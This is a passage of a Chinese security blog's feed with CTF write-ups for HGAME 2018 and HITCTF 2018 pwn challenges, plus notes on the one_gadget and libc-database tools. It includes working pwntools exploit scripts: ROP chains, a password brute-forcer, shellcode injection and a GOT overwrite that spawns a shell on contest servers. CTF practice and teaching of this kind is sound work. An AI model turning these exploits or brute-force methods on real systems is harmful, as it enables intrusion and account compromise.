class="string">'/bin/sh'</span>)))+p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"><span class="comment">#add('step3\n',18,0x60,'a'*0x40)</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x000000000040104c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040104e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401050 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401052 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040104b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040104f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400870 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401053 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000401051 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040104d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400709 : ret</span></span><br><span class="line"><span class="string">0x0000000000400782 : ret 0x2018</span></span><br><span class="line"><span class="string">0x0000000000400abd : ret 0x8b48</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p><a href="/img/hgame2018/hgame.zip">题目</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;HGAME 2018是由杭电的Vidar-Team举办的校内赛，历时一个月，记录一下其中的PWN题目。&lt;/p&gt;
&lt;h1 id=&quot;LEVEL-WEEK-1&quot;&gt;&lt;a href=&quot;#LEVEL-WEEK-1&quot; class=&quot;headerlink&quot; title=&quot;LEVEL - W
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>问题解决及工具使用</title>
    <link href="http://p4nda.top/2018/03/03/question/"/>
    <id>http://p4nda.top/2018/03/03/question/</id>
    <published>2018-03-02T16:00:00.000Z</published>
    <updated>2018-03-26T06:46:43.650Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些工具的使用方法和遇到的问题解决途径</p><h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><p>github : <a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">https://github.com/david942j/one_gadget</a></p><p>所谓 one_gadget 就是一个实现了直接执行system(‘/bin/sh’)的程序跳板。</p><p>常见的，可以使用one_gadget覆盖劫持got表、返回地址、hook（__malloc_hook、__free_hook）等等操作，也就是当可以劫持控制流后覆盖的捷径</p><h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><p>安装one_gadget需要ruby环境，因为是由ruby写成的。</p><p>以ubuntu为例，首先安装ruby</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ruby</span><br></pre></td></tr></table></figure><p>还需要安装ruby的包管理器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gem</span><br></pre></td></tr></table></figure><p>依赖安装好了以后就可以安装one_gadget了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gem install one_gadget</span><br></pre></td></tr></table></figure><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>一般针对libc使用，直接one_gadget libc.so就可以了</p><p>输出结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">└─[$] &lt;&gt; one_gadget libc64.so </span><br><span class="line"><span class="number">0x45216</span>execve(<span class="string">"/bin/sh"</span>, rsp+<span class="number">0x30</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4526a</span>execve(<span class="string">"/bin/sh"</span>, rsp+<span class="number">0x30</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x30</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xf02a4</span>execve(<span class="string">"/bin/sh"</span>, rsp+<span class="number">0x50</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x50</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xf1147</span>execve(<span class="string">"/bin/sh"</span>, rsp+<span class="number">0x70</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x70</span>] == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure><p>当泄露了libc基地址以后再用libc base+offset就可以使用了，但需要注意one_gadget的输出是有一定限制的，如[$rax = NULL]，需要逐个尝试。</p><h2 id="libc-database"><a href="#libc-database" class="headerlink" title="libc database"></a>libc database</h2><p>github: <a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">https://github.com/niklasb/libc-database</a></p><p>有一些PWN题故意不给libc文件，但是可以泄露地址，libc database可以利用泄露的地址来确定服务器使用的libc。</p><h3 id="安装方法-1"><a href="#安装方法-1" class="headerlink" title="安装方法"></a>安装方法</h3><p>先下载libc database</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/niklasb/libc-database</span><br></pre></td></tr></table></figure><p>利用get来下载流行的libc库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd libc-database</span><br><span class="line">./get</span><br></pre></td></tr></table></figure><p>程序会自动在ubuntu网站上下载相关的libc文件，存储到./db文件夹下</p><p><img src="/img/questions/2_1.png" alt=""></p><h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><p>使用./find可以在db中找到对应libc，如泄露的地址是printf 0xf7xxxx260  puts 0xf7xxxf30，输入最后三位即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./find printf 260 puts f30</span><br><span class="line">archive-glibc (id libc6_2.19-10ubuntu2_i386)</span><br></pre></td></tr></table></figure><h1 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h1><h2 id="ida-“sp-analysis-failed”-错误"><a href="#ida-“sp-analysis-failed”-错误" class="headerlink" title="ida “sp-analysis failed” 错误"></a>ida “sp-analysis failed” 错误</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>具体情况是在分析QWB CTF 2018 比赛中raisepig一题中，发现某些函数在按F5进行反编译时，出现这个问题，导致无法查看反编译代码。</p><p>参考了<a href="http://www.cnblogs.com/echo579/p/6236277.html" target="_blank" rel="noopener">本队大佬的博客</a>以后，解决了问题。</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>问题原因貌似是在代码执行中的pop、push操作不匹配，导致ida解析的时候对esp的值产生错误造成的。这种不匹配可能对程序执行并无影响。</p><p><strong>一种可能的解决办法是：</strong> </p><p>首先，在ida中打开栈指针的显示：options-general-stack pointer (勾选)</p><p><img src="/img/questions/Q1_1.png" alt=""></p><p>结果会在原来的地址偏移的旁边，显示函数栈内ESP寄存器的偏移：<br><img src="/img/questions/Q1_2.png" alt=""></p><p>可以看到在出现问题的函数中，retn前的偏移是一个非0值，这回导致ida识别函数出错，<strong>修改的目的就是使这个值为0</strong>，修改办法是使用“ALT + K”快捷键，强行使esp保持平衡，具体操作是：</p><p><strong>在leave这一行（这很重要）</strong>按快捷键“ALT+K”，修改其值为leave前方标志的其ESP偏移值：</p><p><img src="/img/questions/Q1_4.png" alt=""></p><p>当发现，retn前标志的ESP偏移是00时，按F5应该就可以反编译了（<strong>不要care红色的报错，果断的按F5！</strong>）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;记录一些工具的使用方法和遇到的问题解决途径&lt;/p&gt;
&lt;h1 id=&quot;工具使用&quot;&gt;&lt;a href=&quot;#工具使用&quot; class=&quot;headerlink&quot; title=&quot;工具使用&quot;&gt;&lt;/a&gt;工具使用&lt;/h1&gt;&lt;h2 id=&quot;one-gadget&quot;&gt;&lt;a href=&quot;#one-ga
      
    
    </summary>
    
    
      <category term="Questions" scheme="http://p4nda.top/tags/Questions/"/>
    
  </entry>
  
  <entry>
    <title>HITCTF 2018 PWN 题记录</title>
    <link href="http://p4nda.top/2018/02/05/hitctf/"/>
    <id>http://p4nda.top/2018/02/05/hitctf/</id>
    <published>2018-02-04T16:34:14.000Z</published>
    <updated>2018-02-02T17:05:49.945Z</updated>
    
    <content type="html"><![CDATA[<p>HITCTF是哈尔滨工业大学组织的一场校赛，在假期时间看了一下题目，锻炼一下，以此记录。</p><p><img src="/img/HITCTF/logo.png" alt=""></p><p>本次比赛共有五道PWN题：</p><ul><li>stackoverflow （栈溢出）</li><li>login（爆破）</li><li>DragonBall（整数溢出）</li><li>nodes（溢出BSS段，影响程序逻辑）</li><li>babynote（UAF）</li></ul><hr><h1 id="stackoverflow"><a href="#stackoverflow" class="headerlink" title="stackoverflow"></a>stackoverflow</h1><p>此题目是PWN题的签到题，函数逻辑简单，在主函数调用的vuln函数中存在明显的栈溢出漏洞</p><p><img src="/img/HITCTF/pwn_1_1.png" alt=""></p><p>可以溢出覆盖0x18个字节，并且没有开启canary保护， 可以利用ROP技术控制执行流</p><p><img src="/img/HITCTF/pwn_1_3.png" alt=""></p><p>如程序中存在一个flag函数，可以直接获取flag</p><p><img src="/img/HITCTF/pwn_1_2.png" alt=""></p><p>exp.py脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug =<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./stackoverflow'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./stackoverflow'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.132.82'</span>,<span class="number">40000</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome to pwn world!\nLeave your name:'</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x28</span>+p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">0x80485df</span>)+p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">0xc0ffee</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><p>此题的整体代码逻辑很清晰，首先登录一次，然后再过一次check，就可以直接得到flag</p><p><img src="/img/HITCTF/pwn_2_1.png" alt=""></p><p>对比两个用户名密码的check函数可以发现其中的不同：</p><p><img src="/img/HITCTF/pwn_2_2.png" alt=""></p><p><img src="/img/HITCTF/pwn_2_3.png" alt=""></p><p>很明显发现其不同点在于strncmp的参数上，第一个函数参数长度是用户输入的长度，第二次是固定的长度。此时可以发现两个hint。</p><ol><li>password的长度是0x20（抖机灵）</li><li>由于password是固定的，因此可以通过爆破的方法来验证，每次爆破一位不断叠加，即可得到其真实密码。</li></ol><p>爆破的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">10_adhUNwj_qidACn_qdXon912_uhdq6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./login'</span>)</span><br><span class="line">    <span class="comment">#libc = ELF('./libc.local.so')</span></span><br><span class="line">    <span class="comment">#off = 0x001b2000</span></span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.230.132.82'</span>, <span class="number">40001</span>)</span><br><span class="line">    <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    <span class="comment">#libc = ELF('./libc_32.so.6')</span></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line">dic = range(<span class="number">33</span>,<span class="number">127</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(j)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> password</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'password'</span> + chr(j)</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        p = process(<span class="string">'./login'</span>)</span><br><span class="line">        context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">'111.230.132.82'</span>, <span class="number">40001</span>)</span><br><span class="line">        <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    p.recvuntil(<span class="string">'Username:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'root'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Password: '</span>)</span><br><span class="line">    p.sendline(password+chr(j))</span><br><span class="line">    a = p.recvline()</span><br><span class="line">    <span class="keyword">print</span> a </span><br><span class="line">    <span class="keyword">if</span> <span class="string">'successful'</span> <span class="keyword">in</span> a:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> chr(j)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'00'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boom</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> password</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x20</span>):</span><br><span class="line">        pro = log.progress(<span class="string">'go'</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            pro.status(<span class="string">'boom for '</span>+chr(j))</span><br><span class="line">            <span class="comment">#tmp = ''</span></span><br><span class="line">            tmp = login(j)</span><br><span class="line">            <span class="comment">#print tmp</span></span><br><span class="line">            <span class="keyword">if</span> tmp!=<span class="string">'00'</span>:</span><br><span class="line">                password = password + tmp</span><br><span class="line">                pro.success(<span class="string">': is '</span>+password)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'password is '</span>,password</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line">boom()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h1 id="DragonBall"><a href="#DragonBall" class="headerlink" title="DragonBall"></a>DragonBall</h1><p>程序大意是 手中共有15个金币， 购买一个龙珠需要5金币，出售一个龙珠3金币，当集齐7颗龙珠以后就能实现愿望了（wish()）。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>wish()函数中有明显的溢出漏洞，但是很不充分，溢出仅能覆盖返回地址和EBP，如果单纯写rop很难，除非有很好的跳板，但是并没有发现jmp xxx的跳板，一度陷入僵局…</p><p><img src="/img/HITCTF/pwn_3_1.png" alt=""></p><p>突然想起查了一下保护开启情况，发现没有开NX保护，也就是说可以执行shellcode…</p><p><img src="/img/HITCTF/pwn_3_2.png" alt=""></p><p>就是说可以在第一块内写入execve(‘/bin/sh’)的shellcode，然后覆盖返回地址去执行，仅需知道该处的地址即可，需要泄露栈地址，此处可以从第一处写入部分去泄露，泄露wish()的ebp地址，即可得到shellcode起始位置的地址了。</p><h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>漏洞在于buy()中，仅检测是否money!=0的情况，也就是说构造一个money不为5的倍数即可无限制购买，很显然可以先买一个再卖出，就剩余13个金币，无论如何都不可能为0，因此可以无限制购买龙珠，最后达成愿望。</p><p><img src="/img/HITCTF/pwn_3_3.png" alt=""></p><p>最终，利用脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./DragonBall'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./DragonBall'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.132.82'</span>, <span class="number">40002</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Tell me your wish: '</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">payload = payload.ljust(<span class="number">0x66</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload+<span class="string">'b'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'ab'</span>)</span><br><span class="line">stack_leak = u32(p.recv(<span class="number">5</span>)[<span class="number">1</span>:])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'stack_leak : '</span>,hex(stack_leak)</span><br><span class="line">offset = <span class="number">0xffa7cc48</span><span class="number">-0xffa7cbc0</span></span><br><span class="line">payload_addr = stack_leak - offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">'shellcode : '</span>,hex(payload_addr)</span><br><span class="line">p.recvuntil(<span class="string">'is it right?\n(Y/N) '</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x38</span>+p32(stack_leak)+p32(payload_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h1 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h1><p>程序的大概内容是程序维护这一个链表，链表各块使用malloc分配，大小为0x38（56）个字节，最开始四字节是一个unsigned int，命名为value，相当于一个索引，之后的48个字节为data，最后四字节为下一个块的地址。</p><p>程序利用value值遍历这个链表，找到这个链表的第一个value相同的项进行修改。</p><p>在这期间没有任何溢出问题。</p><h2 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h2><p>漏洞出现的原因有2点</p><ol><li>程序利用bss段上的某一个值对data长度进行限定,初始值为48</li><li>程序输出是先用sprintf函数拷贝到bss段上某一个位置，在用puts进行打印，而由于该缓存字符串的长度限定有问题，在建立了100个字节以上的节点时，会出现溢出现象，而溢出的点恰好为1中提到的data长度，将其覆盖成为字符’s’，也就是115，进一步造成了堆溢出。</li></ol><p><img src="/img/HITCTF/pwn_4_1.png" alt=""></p><p><img src="/img/HITCTF/pwn_4_2.png" alt=""></p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞利用思路是首先构造100个节点，造成堆溢出，此时可以的输入可以覆盖到下一块的地址部分，也就是说可以劫持链表，利用程序功能造成内存任意读写。</p><ol><li>首先将某数据库的下一块地址覆盖为puts@got地址，这样利用打印功能可以泄露libc的puts函数地址。</li><li>再对该块进行写操作，利用的索引即是泄露的puts地址，因为该块已经在链表中了，将该块地址覆写为一个one_gadget地址，最终利用puts函数的调用触发，即劫持got表。</li></ol><p>利用脚本如下：（io貌似还有点问题没有解决）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./nodes'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./nodes'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.230.132.82'</span>, <span class="number">40003</span>)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(value,data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Value:'</span>)</span><br><span class="line">    p.send(str(value)+<span class="string">'\0'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">    p.sendline(<span class="string">''</span>)</span><br><span class="line">    <span class="comment">#time.sleep()</span></span><br><span class="line">    p.recvuntil(<span class="string">'nodes\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#def change</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">103</span>):</span><br><span class="line">    add(i,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'2\0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Node\'s value:'</span>)</span><br><span class="line">p.sendline(<span class="string">'101'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'New value:'</span>)</span><br><span class="line">p.sendline(<span class="string">'101'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'New data:'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">48</span>+p32(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Value:101\n'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">a = p.recvline()</span><br><span class="line">puts_addr = int(a[<span class="number">6</span>:<span class="number">-1</span>],<span class="number">10</span>)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>] </span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts addr:'</span>,hex(puts_addr)</span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Node\'s value:'</span>)</span><br><span class="line">p.sendline(a[<span class="number">6</span>:<span class="number">-1</span>])</span><br><span class="line">p.recvuntil(<span class="string">'New value:'</span>)</span><br><span class="line">p.sendline(str(libc.address+<span class="number">0x3ac5c</span>))</span><br><span class="line">p.recvuntil(<span class="string">'New data:'</span>)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line">p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x3ac5c execve("/bin/sh", esp+0x28, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp+0x28] == 